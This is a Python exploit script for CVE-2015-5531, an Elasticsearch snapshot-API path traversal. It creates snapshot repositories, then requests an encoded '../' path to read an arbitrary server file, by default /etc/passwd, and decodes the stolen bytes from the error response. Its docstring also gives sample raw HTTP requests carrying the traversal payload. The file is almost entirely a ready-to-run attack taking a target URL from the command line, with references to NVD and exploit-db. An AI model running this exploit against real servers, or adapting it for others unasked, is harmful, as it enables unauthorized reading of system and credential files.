#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
import requests
import contextlib
import ast
import json


log = logging.getLogger(__name__)

"""
POST /_snapshot//pwn HTTP/1.1
Accept-Encoding: identity
Content-Length: 43
Host: 127.0.0.1:9200
Content-Type: application/x-www-form-urlencoded
Connection: close
User-Agent: Python-urllib/2.7

{"type":"fs","settings":{"location":"dsr"}}

----

POST /_snapshot//pwnie HTTP/1.1
Accept-Encoding: identity
Content-Length: 57
Host: 127.0.0.1:9200
Content-Type: application/x-www-form-urlencoded
Connection: close
User-Agent: Python-urllib/2.7

{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}

----

GET /_snapshot/pwn/ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2Fetc%2Fpasswd HTTP/1.1
Accept-Encoding: identity
Host: 127.0.0.1:9200
Connection: close
User-Agent: Python-urllib/2.7
"""


def createSnapdirs(elasticsearch_indexURI, repository_name, snapshot_name):
    '''Create elasticsearch snapshot
    '''
    snapshot_api = '{}/_snapshot/{}'.format(elasticsearch_indexURI, repository_name)

    jsondata = {
        "type": "fs",
        "settings": {"location":"dsr"}
    }

    with contextlib.closing(requests.post(snapshot_api, json=jsondata)) as httpResponse:
        data = json.loads(httpResponse.text)  # {"acknowledged":true}
        if data['acknowledged'] == True:
            pass

    # snapshot_api = '{}/_snapshot/{}-backup'.format(elasticsearch_indexURI, repository_name)

    snapshot_api += 'junkdata'

    jsondata = {
        "type": "fs",
        "settings": {"location":"dsr/snapshot-{}".format(snapshot_name)}
    }

    with contextlib.closing(requests.post(snapshot_api, json=jsondata)) as httpResponse:
        data = json.loads(httpResponse.text)  # {"acknowledged":true}
        if data['acknowledged'] == True:
            pass


def es_traversal(elasticsearch_indexURI, repository_name, snapshot_name, filename):
    '''exploit elasticsearch with CVE-2015-5531
    '''
    isvulnerable, pwned_data = False, ''

    snapshot_api = '{}/_snapshot/{}/{}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..{}'.format(
        elasticsearch_indexURI,
        repository_name,
        snapshot_name,
        requests.utils.quote(filename, safe='')
    )
    with contextlib.closing(requests.get(snapshot_api)) as httpResponse:
        isvulnerable, pwned_data = restore_es_traversal(httpResponse.text)

    return isvulnerable, pwned_data


def restore_es_traversal(data):
    '''
    {'error': 'ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=1244): [114, 111, ..., 101, 10]]', 'status': 400}
    '''
    isvulnerable, pwned_data = False, ''

    data = json.loads(data)
    if 'ElasticsearchParseException' in data['error'] and int(data['status']) == 400:
        isvulnerable = True
        error = data['error']
        xcontent = ast.literal_eval(error.split(': ')[1].replace(']]', ']'))
        pwned_data = ''.join(chr(x) for x in xcontent)

    return isvulnerable, pwned_data


def check(url, filename='/etc/passwd'):
    '''Check if elasticsearch can be exploited with CVE-2015-5531
    '''
    repository_name = 'repository'
    snapshot_name = 'snapshot'

    createSnapdirs(url, repository_name, snapshot_name)
    return es_traversal(url, repository_name, snapshot_name, filename)


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print('[*] Usage: {} <elasticsearch_url> </etc/passwd>')
        sys.exit(1)

    url = sys.argv[1]
    filename = sys.argv[2]

    print(check(url, filename))


## References
# https://nvd.nist.gov/vuln/detail/CVE-2015-5531
# https://www.exploit-db.com/exploits/38383/
# http://www.freebuf.com/vuls/99942.html